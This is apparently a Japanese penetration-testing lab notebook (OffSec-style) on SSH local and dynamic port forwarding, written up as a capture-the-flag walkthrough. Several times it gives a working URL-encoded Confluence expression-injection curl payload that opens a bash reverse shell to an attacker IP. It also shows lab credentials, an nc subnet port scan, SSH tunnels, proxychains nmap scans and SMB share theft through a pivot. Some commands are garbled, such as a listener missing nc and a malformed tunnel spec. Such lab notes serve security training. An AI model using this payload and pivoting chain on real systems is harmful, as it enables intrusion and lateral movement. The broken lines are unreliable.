


https://github.com/PowerShell/Win32-OpenSSH/releases
# SSHローカルポート転送

![[Pasted image 20261128055347.png]]

`Kali`

```bash
#Terminal-1
rlwrap nc -nlvp 4444

#Terminal-2
curl http://192.168.162.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.195/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

CONFLENCE01
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh database_admin@10.4.162.215
sqlpass123
```

`PGDATABASE01`

```bash
ip addr
4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 10.4.162.215/24 brd 10.4.162.255 scope global ens192
5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 172.16.162.254/24 brd 172.16.162.255 scope global ens224

ip route
10.4.162.0/24 dev ens192 proto kernel scope link src 10.4.162.215 
172.16.162.0/24 dev ens224 proto kernel scope link src 172.16.162.254 

for i in $(seq 1 254); do nc -zv -w 1 172.16.162.$i 445; done
```

CONFLENCE01
```bash
ssh -N -L 0.0.0.0:4455:172.16.162.217:445 database_admin@10.4.162.215
sqlpass123

#接続を確認したい場合は別のリバースシェルを確立し以下のコマンドを打ち込む
ss -ntplu
```
![[Pasted image 20261128055357.png]]

`Kali`

```bash
smbclient -p 4455 -L //192.168.162.63/ -U hr_admin --password=Welcome1234

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Scripts         Disk      
        Users           Disk      

smbclient -p 4455 //192.168.162.63/scripts -U hr_admin --password=Welcome1234
ls

get Provisioning.ps1
```

## Lab
```bash
#Kali
rlwrap -nlvp 4444
curl http://192.168.162.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.195/5555%200%3E%261%27%29.start%28%29%22%29%7D/

#CONFULENCE01
ssh -N -L 0.0.0.0:4242in@10.4.162.215:172.16.162.217:4242 database_admin@10.4.162.215
sqlpass123

#Kali
#OffSecポータルからダウンロードしたファイルを使用してコネクションするとFlagが分かる
chmod 777 1e4c3abaa24721e69c1359811673c91f-ssh_local_client 

./1e4c3abaa24721e69c1359811673c91f-ssh_local_client -i 192.168.162.63 -p 4242 
Connecting to 192.168.162.63:4242
Flag: "OS{}"
```


# SSHダイナミックポートフォワーディング

![[Pasted image 20261128055403.png]]
この柔軟性を活用するには、使用するソフトウェアが正しいSOCKSプロトコル形式でパケットを送信できることを確認する必要があります。
## 初期侵入
Kali
```bash
rlwrap nc -nlvp 4444

curl http://192.168.158.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.236/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

## SSHトンネリング
Victim
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh -N -D 0.0.0.0:9999 database_admin@10.4.158.215
sqlpass123
```

## Proxychainの設定
Kali
```bash
tail /etc/proxychains4.conf

sudo cp /etc/proxychains.conf /etc/proxychains.conf.bak
sudo vi /etc/proxychains.conf
```
![[Pasted image 20261128055412.png]]

## Proxychain
### smb接続
```bash
proxychains smbclient -L //172.16.158.217/ -U hr_admin --password=Welcome1234
```
![[Pasted image 20260508223959.png]]

## nmap

```bash
#Top 20 Ports Scan
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.158.217
Discovered open port 445/tcp on 172.16.158.217
Discovered open port 135/tcp on 172.16.158.217
Discovered open port 3389/tcp on 172.16.158.217
Discovered open port 139/tcp on 172.16.158.217

#Port Range Scan
sudo proxychains nmap -vvv -sT -p4870-4900 -Pn 172.16.158.217 | grep open
Discovered open port 4872/tcp on 172.16.158.217
```

## Lab
```bash
chmod 777 218cf66c8276ce6b350b6174e2cf70b1-ssh_dynamic_client

sudo proxychains ./218cf66c8276ce6b350b6174e2cf70b1-ssh_dynamic_client -i 172.16.158.217 -p4872
```
![[Pasted image 20260508224016.png]]
